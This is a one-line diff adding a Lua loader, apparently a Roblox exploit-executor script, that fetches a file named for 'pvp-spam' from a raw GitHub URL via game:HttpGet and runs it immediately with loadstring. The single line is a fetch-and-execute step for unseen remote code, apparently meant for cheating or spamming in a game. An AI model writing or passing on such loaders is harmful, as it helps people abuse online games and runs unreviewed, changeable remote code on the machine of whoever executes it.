@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/roworld-world-pvp-spam3-1fcxprnfo547nv.lua"))()
